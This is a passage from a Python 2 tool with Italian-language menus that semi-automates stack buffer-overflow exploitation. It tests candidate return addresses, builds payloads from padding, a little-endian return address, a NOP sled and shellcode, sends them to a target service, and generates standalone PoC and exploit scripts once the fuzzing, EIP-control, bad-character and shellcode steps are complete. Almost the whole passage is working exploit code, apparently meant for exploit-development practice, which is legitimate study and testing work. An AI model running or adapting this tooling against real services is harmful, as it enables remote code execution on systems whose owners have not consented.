			print "\t      !mona find -s \"\\xff\\xe4\" -m *"
			print "\n--------------------------------------------------------------------"
			
			scelta = raw_input ("[?] Scelta: ")

			# ----------------------------------------------------------------------------

			if scelta == "1":
				correct = False
				while (not correct):
					try:
						maddr = raw_input("[?] Inserisci esadecimale: ")
						maddr.decode('hex')
						if (len(maddr) == 8):
							return_address = lendian_address(maddr)
							correct = True
						else:
							raise Exception("Valore non valido")
					except KeyboardInterrupt:
						break
					except Exception, e:
						print RED + "[!] ERRORE: " + str(e) + "\n" + NC
						correct = False

			# ----------------------------------------------------------------------------

			if scelta == "2":
				print "[i] Inserimento in sequenza (ctrl+c per terminare)"
				while (True):
					try:
						maddr = raw_input("[?] Inserisci esadecimale: ")
						maddr.decode('hex')
						if (len(maddr) == 8):
							candidate.append(lendian_address(maddr))
						else:
							raise Exception("Valore non valido")
					except KeyboardInterrupt:
						break
					except Exception, e:
						print RED + "[!] ERRORE: " + str(e) + "\n" + NC
						correct = False

				'''
			if scelta == "2":
				correct = False
				while (not correct):
					try:
						maddr = raw_input("[?] Inserisci esadecimale: ")
						maddr.decode('hex')
						if (len(maddr) == 8):
							candidate.append(lendian_address(maddr))
							correct = True
						else:
							raise Exception("Valore non valido")
					except KeyboardInterrupt:
						break
					except Exception, e:
						print RED + "[!] ERRORE: " + str(e) + "\n" + NC
						correct = False
				'''

			# ----------------------------------------------------------------------------

			elif scelta == "3":
				try:
					if raw_input("\n[?] Rimuovere tutti valori inseriti [Y/n]? ") == "Y": candidate = []
					else: pass

				except KeyboardInterrupt:
					pass

			# ----------------------------------------------------------------------------

			elif scelta == "4":
				try:
					_tester ()

					payload = ("\x41" * buffer_length) + return_address.decode('hex') + ("\x90" * 16) + shellcode.decode('hex') + ("\x43" * (space - 16 - len(shellcode.decode('hex'))))

					print "\n[*] Invio payload..."
					sock.connect()
					status = sock.run_protocol_exploit(config, payload)

					while (status < 0):
						print YELLOW + "[!] Invio fallito con errore: " + str(status) + NC
						raw_input ("[?] Riavviare il servizio e premere invio: ")
						print "\n[*] Invio payload..."
						status = sock.run_protocol_exploit(config, payload)


					time.sleep(1)
					if raw_input("\n\n[?] E' stato eseguito la shellcode [Y/n]? ") == "Y":
						SESSION ['find_return_address']['return_address'] = return_address
						print GREEN + "\n[*] Indirizzo di ritorno trovato correttamente." + NC
						print "\n\n--------------------------------------------------------------------"
						raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0

					else:
						print RED + "\n[!] ERRORE: Verifica indirizzo di ritorno fallita." + NC
						print "\n\n--------------------------------------------------------------------"
						raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1

				except KeyboardInterrupt:
					pass

			# ----------------------------------------------------------------------------
			

			elif scelta == "5":
				try:
					for cc in candidate:

						print "\n\n\n[*] Testo indirizzo candidato " + PURPLE + str(cc) + NC

						_tester ()

						payload = ("\x41" * buffer_length) + cc.decode('hex') + ("\x90" * 16) + shellcode.decode('hex') + ("\x43" * (space - 16 - len(shellcode.decode('hex'))))

						print "\n[*] Invio payload..."
						sock.connect()
						status = sock.run_protocol_exploit(config, payload)

						while (status < 0):
							print YELLOW + "[!] Invio fallito con errore: " + str(status) + NC
							raw_input ("[?] Riavviare il servizio e premere invio: ")
							print "\n[*] Invio payload..."
							status = sock.run_protocol_exploit(config, payload)

						time.sleep(1)
						if raw_input("\n\n[?] E' stato eseguito la shellcode [Y/n]? ") == "Y":
							SESSION ['find_return_address']['return_address'] = cc
							print GREEN + "\n[*] Indirizzo di ritorno trovato correttamente." + NC
							print "\n\n--------------------------------------------------------------------"
							raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0

						else:
							pass

					if len(candidate) > 0:
						SESSION ['find_return_address']['candidate'] = candidate

					print YELLOW + "\n[!] ERRORE: Nessun indirizzo funzionante trovato." + NC
					print "\n\n--------------------------------------------------------------------"
					raw_input ("[?] Premere invio per tornare al menu' principale: "); return -1


				except KeyboardInterrupt:
					pass


			# ----------------------------------------------------------------------------

			elif scelta == "6":
				try:
					print "\n[*] Indirizzo di ritorno: " + str(PURPLE + str(return_address) + NC if return_address != None else RED + str(return_address) + NC)
					print "[*] Candidati: " + str(PURPLE + ', '.join([str(x) for x in candidate]) + NC if candidate != [] else RED + str(candidate) + NC)
					SESSION ['find_return_address']['candidate'] = candidate
					SESSION ['find_return_address']['return_address'] = return_address
					print "\n\n--------------------------------------------------------------------"
					raw_input ("[?] Premere invio per tornare al menu' principale: "); return 0
				except KeyboardInterrupt:
					pass

		except KeyboardInterrupt:
			return -1



def fx_build_poc():
	global SESSION
	_banner ("BUILD PoC (Proof Of Concept")

	minimum = True
	correct = True
	print "[i] Controllo in corso...\n"

	if (SESSION ['raw_fuzzing']['buffer_apprx_length'] != None): print "\t- RAW FUZZING\t\t*\t" + GREEN + "Completato" + NC
	else: print "\t- RAW FUZZING\t\t*\t" + RED + "Incompleto" + NC; correct = False; minimum = False

	if (SESSION ['precise_fuzzing']['buffer_length'] != None): print "\t- PRECISE FUZZING\t\t" + GREEN + "Completato" + NC
	else: print "\t- PRECISE FUZZING\t\t" + YELLOW + "Incompleto" + NC; correct = False

	if (SESSION ['control_eip']['control_eip_pass'] != None): print "\t- CONTROL EIP\t\t\t" + GREEN + "Completato" + NC
	else: print "\t- CONTROL EIP\t\t\t" + YELLOW + "Incompleto" + NC

	if (SESSION ['space_check']['space'] != None): print "\t- SPACE CHECK\t\t\t" + GREEN + "Completato" + NC
	else: print "\t- SPACE CHECK\t\t\t" + YELLOW + "Incompleto" + NC; correct = False

	if (SESSION ['find_badchar']['badchar'] != None): print "\t- FIND BADCHAR\t\t\t" + GREEN + "Completato" + NC
	else: print "\t- FIND BADCHAR\t\t\t" + YELLOW + "Incompleto" + NC; correct = False

	if (SESSION ['shellcode']['shellcode'] != None): print "\t- GENERATE SHELLCODE\t\t" + GREEN + "Completato" + NC
	else: print "\t- GENERATE SHELLCODE\t\t" + YELLOW + "Incompleto" + NC; correct = False

	if (SESSION ['find_return_address']['return_address'] != None): print "\t- FIND RETURN ADDRESS\t\t" + GREEN + "Completato" + NC
	else: print "\t- FIND RETURN ADDRESS\t\t" + YELLOW + "Incompleto" + NC; correct = False

	if (minimum == True):

		if (correct == True):

			print GREEN + "\n[*] INFO: Tutti gli step fondamentali sono stati già stati" + NC
			print GREEN + "          completati. Si consiglia di creare un exploit." + NC
			print "\n\n--------------------------------------------------------------------"
			
			if raw_input("\n\n[?] Continuare con la creazione di un PoC? [Y/n]? ") == "Y": pass
			else: return 0

		filename = raw_input ("\n\n[?] Inserisci un nome [poc.py]: ")
		if (filename == ""): filename = "poc.py"
		
		status = build_poc (config, SESSION, filename)
		if (status == 0):
			print GREEN + "\n[*] PoC (Proof Of Concept) creato con successo. " + NC
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per continuare: ")

		else:
			print RED + "\n\n[!] ERRORE: impossibile creare il PoC (Proof Of Concept). " + NC
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per continuare: ")
		
	else:
		print RED + "\n[!] ERRORE: impossibile creare il PoC, completare gli step con *" + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per continuare: ")



def fx_build_exploit():
	global SESSION
	_banner ("BUILD EXPLOIT")

	correct = True
	print "[i] Controllo in corso...\n"

	if (SESSION ['raw_fuzzing']['buffer_apprx_length'] != None): print "\t- RAW FUZZING\t\t*\t" + GREEN + "Completato" + NC
	else: print "\t- RAW FUZZING\t\t*\t" + RED + "Incompleto" + NC; correct = False

	if (SESSION ['precise_fuzzing']['buffer_length'] != None): print "\t- PRECISE FUZZING\t*\t" + GREEN + "Completato" + NC
	else: print "\t- PRECISE FUZZING\t*\t" + RED + "Incompleto" + NC; correct = False

	if (SESSION ['control_eip']['control_eip_pass'] != None): print "\t- CONTROL EIP\t\t\t" + GREEN + "Completato" + NC
	else: print "\t- CONTROL EIP\t\t\t" + YELLOW + "Incompleto" + NC

	if (SESSION ['space_check']['space'] != None): print "\t- SPACE CHECK\t\t*\t" + GREEN + "Completato" + NC
	else: print "\t- SPACE CHECK\t\t*\t" + RED + "Incompleto" + NC; correct = False

	if (SESSION ['find_badchar']['badchar'] != None): print "\t- FIND BADCHAR\t\t*\t" + GREEN + "Completato" + NC
	else: print "\t- FIND BADCHAR\t\t*\t" + RED + "Incompleto" + NC; correct = False

	if (SESSION ['shellcode']['shellcode'] != None): print "\t- GENERATE SHELLCODE\t*\t" + GREEN + "Completato" + NC
	else: print "\t- GENERATE SHELLCODE\t*\t" + RED + "Incompleto" + NC; correct = False

	if (SESSION ['find_return_address']['return_address'] != None): print "\t- FIND RETURN ADDRESS\t*\t" + GREEN + "Completato" + NC
	else: print "\t- FIND RETURN ADDRESS\t*\t" + RED + "Incompleto" + NC; correct = False

	if (correct == True):

		filename = raw_input ("\n\n[?] Inserisci un nome [exploit.py]: ")
		if (filename == ""): filename = "exploit.py"
		
		status = build_exploit (config, SESSION, filename)
		if (status == 0):
			print GREEN + "\n[*] Exploit creato con successo. " + NC
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per continuare: ")

		else:
			print RED + "\n\n[!] ERRORE: impossibile creare l'exploit. " + NC
			print "\n\n--------------------------------------------------------------------"
			raw_input ("[?] Premere invio per continuare: ")


	else:
		print RED + "\n[!] ERRORE: impossibile creare l'exploit, completare gli step con *" + NC
		print "\n\n--------------------------------------------------------------------"
		raw_input ("[?] Premere invio per continuare: ")


#################################################################################################



_main_menu ()

